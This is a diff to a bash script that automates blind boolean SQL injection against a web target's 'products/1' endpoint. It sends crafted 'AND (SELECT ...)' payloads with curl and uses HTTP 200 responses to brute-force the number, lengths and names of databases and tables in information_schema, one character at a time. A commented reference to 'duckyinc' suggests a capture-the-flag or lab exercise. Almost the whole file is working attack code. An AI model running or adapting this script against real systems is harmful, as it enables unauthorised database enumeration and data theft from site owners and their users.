@@ -44,13 +44,11 @@ function getLength() {
 	# IT Create from three parameter the sqli!
 
 	START_Y=1
-	END_Y=$((object['amountOfDatabases']))
+	#END_Y=$((object['amountOfDatabases']))
+	END_Y=$2
 	results=''
 	sqlQuery="$1"
 	object['condition']='enumarteViaNumber'
-
-
-	#object['condition']='enumarteViaAlphabet'
 
 	for (( indey=$START_Y; indey<=$END_Y; indey++)); do
 		count=$((indey-1))
@@ -78,10 +76,10 @@ function getAmount() {
 
 	sqlQuery=$1
 
-	tableName='information_schema.tables'
-	condition="table_schema = ${database}"
+	#tableName='information_schema.tables'
+	#condition="table_schema = ${database}"
 
-	for index in {1..6}; do
+	for index in {1..100}; do
 		sqli="AND (${sqlQuery}) = $index"
 		request "$sqli"
 		result=$(echo $?)
@@ -93,37 +91,31 @@ function getAmount() {
 }
 
 function bruteForceName() {
-	#  sqli="and (SELECT substr(LOWER(table_name), $index,1) FROM information_schema.tables WHERE table_schema = 'duckyinc' LIMIT 1 OFFSET $offset) = '$letter'"
-	echo "i will get the name"
 	# required:
 	# - length
-	# - count
-	# - database/table/columns
-	# sqli
+	# - length of names
+	# - sql query
+	#
+	# FOR -> database/table/columns/content
 
-	#1 many of databases = 5
-	#-> loop 5 times
-	#2 the length of the word 1 = 10
-	# -> second loop
-	# 3 inside the loop from 2 check if alphabet is equql
 
 	sqlQuery=$1
-	#SELECT substr(LOWER(DATABASE()), %d,1)
 	placeholderSqli="AND (${sqlQuery}) = '%s'"
 
+	# length of the result <int>
 	length=$((object['amountOfDatabases']))
+	# lenth of the names as <string list>
 	databaseNameLength=(${object['lengthOfDatabaseNames']})
-	#'SELECT substr(LOWER(DATABASE()), $index,1)
-	list=()
 
 	for (( index=0; index<=$((length-1)); index++ )); do
+		# length of the string(database, table, column, content)
 		limit="${databaseNameLength[$index]}"
-		name=''
 		for (( i=0; i<=$limit; i++ )); do
-			number=$((i+1))
+			# sql function 'substr()' starts at the number one and not with zero
+			extractionStartPosition=$((i+1))
 			offset=$index
 			for letter in {{a..z},_}; do
-				sqli="$(printf "${placeholderSqli}" "$number" "$offset" "$letter")"
+				sqli="$(printf "${placeholderSqli}" "$extractionStartPosition" "$offset" "$letter")"
 				request "${sqli}"
 				result=$(echo $?)
 				if [ $result -eq 0 ]; then
@@ -132,22 +124,21 @@ function bruteForceName() {
                 		fi
 			done
 		done
-		echo "$name"
-		list+="${name}"
+		# add to <string list> and clean the variable 'name'
+		list+="${name} "
+		name=''
 	done
+	echo "${list[@]}"
 }
 
 function request() {
-	#echo 'i will take care of the request and also the validation of the response'
 	# rquired
 	# - parsed url
 	# take care of parsing url!
+
 	SPACE="%20"
 	encodedUrl=$(encodeToUrl "$1")
-	#echo "$encodedUrl"
-	#echo "$URL/${PATH}%20${encodedUrl}"
 	/usr/bin/curl --silent -i "$URL/${PATH}${SPACE}${encodedUrl}" | /usr/bin/head -n 1 | /usr/bin/grep -q '200'
-	#/usr/bin/curl --silent -i $URL/"${PATH}%20${encodedUrl}" | /usr/bin/head -n 1
 }
 
 #SQLiTablesCount="SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=${database}"
@@ -158,17 +149,28 @@ URL="http://${target}"
 PATH="products/1"
 
 # find all datbases that are not standad only the number!
-# which are in mysql standard?
-# mysql, information_schema
+## count all databases
+object['amountOfDatabases']=$(getAmount 'SELECT COUNT(*) FROM information_schema.schemata')
+## get the length of the names
+object['lengthOfDatabaseNames']=$(getLength 'SELECT length(schema_name) FROM information_schema.schemata' "${object['amountOfDatabases']}")
+## get the names
+object['namesOfDatabases']=$(bruteForceName 'SELECT substr(LOWER(schema_name), %d,1) FROM information_schema.schemata LIMIT 1 OFFSET %d')
 
-#amountOfDatabases=$(getAmount 'SELECT COUNT(*) FROM information_schema.schemata')
-#echo "There are ${amountOfDatabases} in the server"
-# es sind 5 databases drinne!
-object['amountOfDatabases']='5'
-#object['lengthOfDatabaseNames']=$(getLength 'SELECT length(schema_name) FROM information_schema.schemata')
-object['lengthOfDatabaseNames']=$(getLength 'SELECT length(schema_name) FROM information_schema.schemata')
 
-# get Database name
-echo "database names => ${object['lengthOfDatabaseNames']}"
-bruteForceName 'SELECT substr(LOWER(schema_name), %d,1) FROM information_schema.schemata LIMIT 1 OFFSET %d'
-#bruteForceName '(SELECT substr(DATABASE(),1,1)) = '
+# find all names from a specific databse:
+echo "which database want you to be searched: ${object['namesOfDatabases']} \n >>"
+read toSearchedDatabase
+object['toSearchedDatabase']="$toSearchedDatabase"
+
+## count tables
+sqlQuery="SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema = '${object['toSearchedDatabase']}'"
+object['amountOfTables']=$(getAmount "$sqlQuery")
+## get length of the names
+sqlQuery="SELECT length(table_name) FROM information_schema.tables WHERE table_schema = '${object['toSearchedDatabase']}'"
+object['lengthOfTablesNames']=$(getLength "$sqlQuery" "${object['amountOfTables']}")
+## get the tables names
+sqlQuery="SELECT substr(LOWER(table_name), %d,1) FROM information_schema.tables WHERE table_schema = '${object['toSearchedDatabase']}' LIMIT 1 OFFSET %d"
+object['nameOfTables']=$(bruteForceName "$sqlQuery")
+
+
+echo "${object['nameOfTables']}"
